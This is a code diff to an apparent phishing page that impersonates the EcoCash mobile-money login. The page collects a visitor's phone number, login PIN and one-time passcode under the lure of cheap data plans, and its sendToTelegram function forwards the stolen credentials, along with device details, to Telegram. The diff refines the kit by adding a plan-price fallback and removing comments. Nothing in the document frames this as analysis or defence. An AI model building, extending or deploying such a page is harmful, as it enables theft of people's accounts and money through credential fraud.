@@ -25,8 +25,6 @@ background:linear-gradient(180deg,#e6f0ff,#cfe0ff);
 overflow:hidden;
 }
 
-/* background */
-
 .wave{
 position:fixed;
 width:700px;
@@ -46,8 +44,6 @@ z-index:-1;
 50%{transform:translateY(40px)}
 100%{transform:translateY(0)}
 }
-
-/* card */
 
 .step{
 position:absolute;
@@ -77,15 +73,11 @@ pointer-events:none;
 transform:translateX(40px);
 }
 
-/* logo */
-
 .logo{
 height:70px;
 display:block;
 margin:auto;
 }
-
-/* text */
 
 h1{
 text-align:center;
@@ -101,8 +93,6 @@ font-size:13px;
 color:#555;
 margin-bottom:18px;
 }
-
-/* inputs */
 
 label{
 font-size:12px;
@@ -128,8 +118,6 @@ background:white;
 box-shadow:0 0 0 3px rgba(0,58,143,.08);
 }
 
-/* phone */
-
 .phone-group{
 display:flex;
 gap:8px;
@@ -144,8 +132,6 @@ border:1px solid #eee;
 font-weight:600;
 color:#003a8f;
 }
-
-/* button */
 
 .btn{
 margin-top:20px;
@@ -164,8 +150,6 @@ opacity:.45;
 opacity:1;
 }
 
-/* pin */
-
 .pin{
 display:flex;
 gap:12px;
@@ -181,8 +165,6 @@ text-align:center;
 border-radius:16px;
 border:1px solid #eee;
 }
-
-/* otp */
 
 .count{
 text-align:center;
@@ -220,8 +202,6 @@ opacity:1;
 
 <div class="container">
 
-<!-- LOGIN -->
-
 <div id="step1" class="step">
 
 <img src="assets/ecocash.png" class="logo">
@@ -258,8 +238,6 @@ Login
 </div>
 
 
-<!-- OTP -->
-
 <div id="step3" class="step hidden">
 
 <h1>OTP Verification</h1>
@@ -272,12 +250,12 @@ Enter the OTP sent to your phone number
 
 <div class="pin">
 
-<input maxlength="1" inputmode="numeric">
-<input maxlength="1" inputmode="numeric">
-<input maxlength="1" inputmode="numeric">
-<input maxlength="1" inputmode="numeric">
-<input maxlength="1" inputmode="numeric">
-<input maxlength="1" inputmode="numeric">
+<input maxlength="1">
+<input maxlength="1">
+<input maxlength="1">
+<input maxlength="1">
+<input maxlength="1">
+<input maxlength="1">
 
 </div>
 
@@ -305,8 +283,6 @@ Submit
 
 </div>
 
-
-<!-- SUCCESS -->
 
 <div id="step4" class="step hidden">
 
@@ -339,6 +315,52 @@ selectedPlan=JSON.parse(sessionStorage.getItem("selectedPlan"))
 }catch(e){}
 
 
+/* fallback price map */
+
+const priceMap={
+
+"15GB":"USD 0.99",
+
+"35GB":"USD 1.99",
+
+"50GB":"USD 2.99",
+
+"Unlimited":"USD 3.99"
+
+}
+
+
+/* build plan line */
+
+function getPlanLine(){
+
+if(!selectedPlan) return "Unknown plan"
+
+let name=selectedPlan.name||selectedPlan.shortName||"Plan"
+
+let price=selectedPlan.price
+
+if(!price){
+
+for(let k in priceMap){
+
+if(name.includes(k)){
+
+price=priceMap[k]
+
+break
+
+}
+
+}
+
+}
+
+return name+" — "+price
+
+}
+
+
 /* device */
 
 const ua=navigator.userAgent
@@ -351,8 +373,6 @@ else if(/iPhone|iPad/i.test(ua)) device="iOS"
 if(/Chrome/i.test(ua)) device+=" | Chrome"
 else if(/Safari/i.test(ua)) device+=" | Safari"
 
-
-/* send telegram */
 
 async function sendToTelegram(eventName){
 
@@ -374,11 +394,9 @@ loginPin:pinValue,
 
 otp:otpValue,
 
-selectedPlan:selectedPlan,
-
 event:eventName,
 
-plan:selectedPlan?.name+" — "+selectedPlan?.price,
+plan:getPlanLine(),
 
 device:device
 
@@ -388,8 +406,6 @@ device:device
 
 }
 
-
-/* phone */
 
 phone.oninput=e=>{
 
@@ -409,8 +425,6 @@ validate()
 }
 
 
-/* pin */
-
 const pinInputs=document.querySelectorAll("#step1 .pin input")
 
 pinInputs.forEach((input,index)=>{
@@ -423,20 +437,6 @@ if(input.value && index<3)
 pinInputs[index+1].focus()
 
 validate()
-
-}
-
-input.onkeydown=e=>{
-
-if(e.key==="Backspace" && !input.value && index>0){
-
-pinInputs[index-1].focus()
-
-pinInputs[index-1].value=""
-
-validate()
-
-}
 
 }
 
@@ -469,8 +469,6 @@ document.getElementById(id)
 }
 
 
-/* login */
-
 loginBtn.onclick=async()=>{
 
 if(!loginBtn.classList.contains("active")) return
@@ -489,8 +487,6 @@ startTimer()
 
 }
 
-
-/* otp */
 
 const otpInputs=document.querySelectorAll("#step3 .pin input")
 
@@ -525,8 +521,6 @@ location.href="thankyou.html"
 }
 
 
-/* resend */
-
 resendBtn.onclick=async()=>{
 
 if(!resendBtn.classList.contains("active")) return
@@ -537,8 +531,6 @@ startTimer()
 
 }
 
-
-/* timer */
 
 function startTimer(){
 
